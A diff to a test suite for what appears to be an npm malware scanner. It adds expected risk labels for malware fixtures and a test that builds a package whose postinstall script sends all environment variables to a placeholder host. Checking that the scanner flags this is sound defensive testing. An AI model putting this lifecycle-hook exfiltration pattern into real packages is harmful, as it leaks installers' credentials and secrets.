@@ -34,11 +34,40 @@ EXPECT = {
     "mal-exec-curl": ("CRITICAL", "download_execute"),
     "mal-recon-beacon": ("HIGH", "recon_beacon"),
     "mal-nodered-oauthpath": ("MEDIUM", "nodered_admin_noauth"),
+    # added from the DataDog real-malware recall benchmark (RECALL.md)
+    "mal-depconf-beacon": ("CRITICAL", "host_fingerprint_exfil"),
+    "mal-remote-dep": ("HIGH", "remote_dependency"),
+    "mal-encoded-require": ("HIGH", "obfuscation"),
+    "mal-eval-response": ("CRITICAL", "download_execute"),
+    "mal-hidden-code": ("HIGH", "hidden_code"),
+    "mal-gyp-exec": ("CRITICAL", "env_exfil"),
+    "mal-spawned-payload": ("CRITICAL", "host_fingerprint_exfil"),
+    "mal-wallet-seed": ("HIGH", "wallet_secret_exfil"),
+    "mal-charcode-eval": ("HIGH", "obfuscation"),
+    "mal-obfio-rotation": ("HIGH", "obfuscation"),
 }
 
 
 # fixtures that must land on an exact level while NOT firing a given rule
 PARTIAL = {"ok-n8n-callback": ("HIGH", "automation_credential_exfil")}
+
+
+def _tarball_check():
+    import io, tarfile, tempfile
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
+        for name, body in (("package/package.json", '{"name":"t","version":"1.0.0","scripts":{"postinstall":"node i.js"}}'),
+                           ("package/i.js", "require('https').request({hostname:'c.invalid'}).end(JSON.stringify(process.env))")):
+            data = body.encode()
+            ti = tarfile.TarInfo(name); ti.size = len(data)
+            tf.addfile(ti, io.BytesIO(data))
+    with tempfile.NamedTemporaryFile(suffix=".tgz", delete=False) as fh:
+        fh.write(buf.getvalue())
+    try:
+        r = na.audit_tarball(fh.name)
+    finally:
+        os.unlink(fh.name)
+    return r["risk_level"] == "CRITICAL" and r["target"].startswith("t@1.0.0")
 
 
 def main():
@@ -72,6 +101,7 @@ def main():
         (na.scan_package({"package.json": '{"name":"x"}', "a.html": "<script>eval(atob('Y2FuYXJ5'))</script>"})["risk_level"] == "SAFE",
          "html ignored outside node-red"),
     ]
+    checks.append((_tarball_check(), "local .tgz scan (npm pack layout) reads lifecycle scripts"))
     for ok, label in checks:
         fails += not ok
         print("%s %s" % ("PASS" if ok else "FAIL", label))
